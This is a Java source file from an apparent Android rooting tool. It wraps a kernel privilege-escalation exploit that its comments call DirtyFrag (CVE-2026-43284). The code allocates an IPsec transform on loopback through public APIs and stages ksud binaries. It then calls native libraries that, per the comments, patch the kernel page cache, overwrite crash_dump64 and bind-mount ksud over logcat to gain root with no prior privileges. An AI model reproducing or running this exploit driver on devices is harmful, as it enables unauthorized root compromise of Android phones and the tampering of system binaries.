package df.root;

import android.content.Context;
import android.net.IpSecAlgorithm;
import android.net.IpSecManager;
import android.net.IpSecTransform;
import android.os.Build;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.security.SecureRandom;

/**
 * "New method (fast)" engine — port of diabl0w/DFRoot (DirtyFrag CVE-2026-43284).
 * Public APIs only: IpSecManager allocates the socket + SPI + transform, the
 * native engine (libexp/libexpnext) patches the kernel page cache and ksud
 * is bind-mounted over logcat. No root, no Shizuku, no profile. A059 first
 * runs a source-built, non-root page-cache read-back preflight.
 *
 * NOTE: this is the EXACT 4.4.7 engine (the version whose manual Root now
 * was proven working on-device). The caller loads the native lib itself.
 */
public final class DFBridge {

    private static boolean loaded = false;
    private static boolean diagnosticLoaded = false;

    private DFBridge() {}

    /** Loads the flavor-matching native engine (same JNI symbol in both). */
    public static synchronized void load(boolean next) {
        if (loaded) return;
        System.loadLibrary(next ? "expnext" : "exp");
        loaded = true;
    }

    /** Loads the A059-only native preflight; the main engine remains prebuilt. */
    private static synchronized void loadDiagnostic() {
        if (diagnosticLoaded) return;
        System.loadLibrary("expdiag");
        diagnosticLoaded = true;
    }

    public static native int nativeRunAll(IReporter reporter, int encapPort, int spi,
                                          byte[] aesCbcKey, byte[] hmacKey, int icvLen,
                                          int senderPort, boolean softReboot);

    private static native int nativeProbeCrashDump(IReporter reporter, int encapPort, int spi,
                                                    byte[] aesCbcKey, byte[] hmacKey, int icvLen,
                                                    int senderPort);

    /** One full privileged-free root run. Returns the engine rc (0 = rooted). */
    public static int run(Context context, boolean next, boolean softReboot, IReporter reporter) {
        IpSecManager.UdpEncapsulationSocket encapSock = null;
        IpSecManager.SecurityParameterIndex spiObj = null;
        IpSecTransform transform = null;
        try {
            IpSecManager ipsec = (IpSecManager) context.getSystemService(Context.IPSEC_SERVICE);

            encapSock = ipsec.openUdpEncapsulationSocket();
            int encapPort = encapSock.getPort();
            reporter.report("encap port: " + encapPort + "\n");

            InetAddress loopback = InetAddress.getByName("127.0.0.1");
            spiObj = ipsec.allocateSecurityParameterIndex(loopback);
            int spiVal = spiObj.getSpi();
            reporter.report("spi: 0x" + Integer.toHexString(spiVal) + "\n");

            SecureRandom rng = new SecureRandom();
            byte[] aesKey = new byte[32]; rng.nextBytes(aesKey);
            byte[] hmacKey = new byte[32]; rng.nextBytes(hmacKey);

            IpSecAlgorithm enc = new IpSecAlgorithm(IpSecAlgorithm.CRYPT_AES_CBC, aesKey);
            IpSecAlgorithm auth = new IpSecAlgorithm(IpSecAlgorithm.AUTH_HMAC_SHA256, hmacKey, 128);

            DatagramSocket senderSock = new DatagramSocket();
            int senderPort = senderSock.getLocalPort();
            senderSock.close();

            transform = new IpSecTransform.Builder(context)
                    .setEncryption(enc)
                    .setAuthentication(auth)
                    .setIpv4Encapsulation(encapSock, senderPort)
                    .buildTransportModeTransform(loopback, spiObj);

            // On A059 the native engine currently reports that crash_dump64
            // was patched, but the device then runs the original Android binary.
            // Verify the page-cache bytes before touching the vendor target.
            if ("A059".equals(Build.MODEL)) {
                try {
                    loadDiagnostic();
                } catch (Throwable t) {
                    reporter.report("[diag] could not load A059 page-cache probe: " + t + "\n");
                    return 3;
                }
                final int probe;
                try {
                    probe = nativeProbeCrashDump(reporter, encapPort, spiVal,
                            aesKey, hmacKey, 128 / 8, senderPort);
                } catch (Throwable t) {
                    reporter.report("[diag] A059 page-cache probe failed: " + t + "\n");
                    return 3;
                }
                if (probe != 0) {
                    reporter.report("[diag] crash_dump64 page-cache write not confirmed; " +
                            "stopping before vendor patch (rc=" + probe + ")\n");
                    return 3;
                }
            }

            stageKsud(context, next, reporter);

            // The Next ksud CLI rejects --soft-reboot: never pass it there.
            boolean sb = next ? false : softReboot;
            int rc = nativeRunAll(reporter, encapPort, spiVal, aesKey, hmacKey, 128 / 8, senderPort, sb);
            return rc;
        } catch (Exception e) {
            reporter.report("\nexception: " + e + "\n");
            return -1;
        } finally {
            closeQuietly(transform);
            closeQuietly(spiObj);
            closeQuietly(encapSock);
        }
    }

    private static void closeQuietly(IpSecTransform value) {
        if (value != null) try { value.close(); } catch (Throwable ignored) { }
    }

    private static void closeQuietly(IpSecManager.SecurityParameterIndex value) {
        if (value != null) try { value.close(); } catch (Throwable ignored) { }
    }

    private static void closeQuietly(IpSecManager.UdpEncapsulationSocket value) {
        if (value != null) try { value.close(); } catch (Throwable ignored) { }
    }

    /** Stages the flavor's ksud (user-patched custom first, then bundled). */
    public static void stageKsud(Context context, boolean next, IReporter reporter) throws IOException {
        stageKsud(context, next, reporter, null);
    }

    /**
     * Same, with an explicit ksud Next profile asset — the id of a file in
     * assets/df/ksud-next/ picked on the home page (see KsudNextProfiles).
     * null = auto: selected profile if any, else the legacy bundled ksud.
     */
    public static void stageKsud(Context context, boolean next, IReporter reporter,
                                 String ksudNextAsset) throws IOException {
        File root = context.getFilesDir().getParentFile();
        // On the integrated Nothing/OnePlus targets, the matching upstream
        // KMI build takes precedence over custom or generic Samsung profiles.
        File targetKsud = next
                ? com.uniroot.app.newmethod.DfKsudUpdater.currentTargetNextKsud(context)
                : com.uniroot.app.newmethod.DfKsudUpdater.currentTargetClassicKsud(context);
        if (targetKsud != null && targetKsud.isFile()) {
            copyFile(targetKsud, new File(root, "ksud"));
            reporter.report("staged target-matched UniRoot ksud (" + targetKsud.getName()
                    + ", " + targetKsud.length() + " bytes)\n");
            return;
        }
        // User-patched ksud (Advanced -> Patch custom ko): wins over bundled.
        File custom = new File(root, next ? "ksud-custom-next" : "ksud-custom-classic");
        if (custom.isFile() && custom.length() > 100_000) {
            if (next) {
                copyFile(custom, new File(root, "ksud-next-real"));
                stageAsset(context, "df/ksud-wrapper-next.sh", new File(root, "ksud"), reporter);
            } else {
                copyFile(custom, new File(root, "ksud"));
            }
            reporter.report("staged CUSTOM ksud (" + custom.length() + " bytes)\n");
            return;
        }
        if (!next) {
            // Classic flavor: the SELECTED classic profile wins (a ksud
            // downloaded by DfKsudUpdater = ksud-classic-latest); the bundled
            // universal is the fallback.
            java.io.File dynClassic = com.uniroot.app.newmethod.KsudClassicProfiles.selectedFile(context);
            if (dynClassic != null && dynClassic.isFile()) {
                copyFile(dynClassic, new File(root, "ksud"));
                reporter.report("staged DYNAMIC classic ksud (" + dynClassic.getName()
                        + ", " + dynClassic.length() + " bytes)\n");
                return;
            }
            stageAsset(context, "df/ksud-new-classic", new File(root, "ksud"), reporter);
            return;
        }
        // Next: profile chosen on the home page (e.g. 3.3.0 / 3.4.0), else
        // the legacy bundled one. v3.4.0 daemonizes first and installs itself
        // from current_exe — staged DIRECTLY like classic, no wrapper needed.
        // DYNAMIC profile (downloaded+patched by DfKsudUpdater): a plain file
        // in filesDir/ksud-next — staged verbatim.
        java.io.File dyn = com.uniroot.app.newmethod.KsudNextProfiles.selectedFile(context);
        if (dyn != null && dyn.isFile()) {
            copyFile(dyn, new File(root, "ksud"));
            reporter.report("staged DYNAMIC ksud " + dyn.getName()
                    + " (" + dyn.length() + " bytes)\n");
            return;
        }
        String asset = ksudNextAsset != null
                ? ksudNextAsset
                : com.uniroot.app.newmethod.KsudNextProfiles.resolveAsset(context);
        if (asset == null) asset = "df/ksud-new-next";
        stageAsset(context, asset, new File(root, "ksud"), reporter);
    }

    private static void copyFile(File src, File dest) throws IOException {
        File tmp = new File(dest.getPath() + ".tmp");
        try (InputStream in = new java.io.FileInputStream(src);
             OutputStream out = new FileOutputStream(tmp)) {
            byte[] buf = new byte[8192];
            for (int n; (n = in.read(buf)) > 0; ) out.write(buf, 0, n);
        }
        if (!tmp.renameTo(dest)) { tmp.delete(); throw new IOException("rename failed: " + dest); }
        dest.setExecutable(true, false);
    }

    private static void stageAsset(Context context, String asset, File dest, IReporter reporter) throws IOException {
        File tmp = new File(dest.getPath() + ".tmp");
        try (InputStream in = context.getAssets().open(asset);
             OutputStream out = new FileOutputStream(tmp)) {
            byte[] buf = new byte[8192];
            for (int n; (n = in.read(buf)) > 0; ) out.write(buf, 0, n);
        }
        if (!tmp.renameTo(dest)) { tmp.delete(); throw new IOException("rename failed: " + dest); }
        dest.setExecutable(true, false);
        reporter.report("staged " + asset + " -> " + dest.getAbsolutePath() + "\n");
    }
}
